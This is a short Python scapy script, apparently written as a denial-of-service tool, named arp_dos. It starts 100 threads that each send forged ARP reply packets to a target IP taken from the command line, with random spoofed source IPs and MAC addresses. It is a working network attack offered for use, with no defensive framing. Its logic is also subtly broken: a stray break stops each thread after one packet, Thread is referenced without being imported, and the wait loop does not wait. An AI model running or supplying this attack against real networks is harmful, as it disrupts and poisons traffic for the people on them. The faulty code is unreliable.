from scapy.all import *
import sys, threading, time

def arp_dos(dst_ip,timeout):
    start_time = time.time()
    while time.time() - start_time < timeout:
        packet = ARP(op=2, pdst=dst_ip, psrc=RandIP('192.168.1.1/24'), hwsrc=RandMAC())
        send(packet,verbose=0)
        print(packet.summary())
        if packet != None:
            break

if __name__ == '__main__':
    dst_ip = sys.argv[1]
    #Timeout in secs
    spam_timeout = 100
    threads = []
    for x in range(100):
        thread = Thread(target=arp_dos, args=(dst_ip, spam_timeout),daemon=True)
        thread.start()
        threads.append(thread)
    
    try:
        while True:
            for thread in threads:
                if thread.is_alive():
                    continue
            break
    except KeyboardInterrupt:
        exit()
